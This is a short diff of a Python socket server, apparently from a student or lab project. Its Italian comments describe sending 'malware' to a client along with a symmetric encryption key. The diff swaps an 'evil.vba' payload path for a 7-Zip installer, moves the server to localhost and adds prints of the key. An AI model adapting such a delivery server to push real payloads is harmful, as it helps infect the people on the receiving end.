@@ -18,8 +18,8 @@ def asymmetricDecryption(encodedMessage, fernet_key):
 
 
 if __name__ == "__main__":
-	ip = "192.168.1.15"
-	port = 1234
+	ip = "127.0.0.1"
+	port = 65432
 
 	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	server.bind((ip, port))
@@ -32,7 +32,7 @@ if __name__ == "__main__":
 
 		# invio del file al client
 		print("Invio del malware al client")
-		path_malware = r"/root/Desktop/evil.vba"
+		path_malware = r"C:\Users\angel\Downloads\7z2201-x64.exe"
 		filesize = os.path.getsize(path_malware)
 
 		# start sending the file
@@ -40,7 +40,9 @@ if __name__ == "__main__":
 		progress = tqdm.tqdm(range(filesize), f"Sending {path_malware}", unit="B", unit_scale=True, unit_divisor=1024)
 		with open(path_malware, "rb") as malware:
 			# send the symmetric key first
+			print("Invio della chiave simmetrica")
 			client.sendall(pickle.dumps(symmetric_key))
+			print("chiave simmetrica: {}".format(str(pickle.dumps(symmetric_key))))
 			# read the bytes from the file
 			bytes_read = malware.read()
 			# update the progress bar
